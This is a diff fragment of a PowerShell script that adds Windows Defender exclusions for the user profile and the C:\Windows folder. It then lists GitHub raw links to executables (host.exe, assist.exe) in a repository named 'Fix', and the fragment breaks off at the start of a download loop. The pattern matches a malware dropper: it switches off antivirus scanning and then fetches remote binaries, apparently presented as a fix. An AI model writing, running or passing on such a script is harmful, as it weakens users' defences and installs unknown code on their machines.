@@ -1,7 +1,7 @@
 Add-MpPreference -ExclusionPath $env:USERPROFILE
 Add-MpPreference -ExclusionPath C:\Windows
 $urls = @(
-    "https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/7000.exe",
+    "https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/host.exe",
     "https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/assist.exe"
 )
 foreach ($url in $urls) {
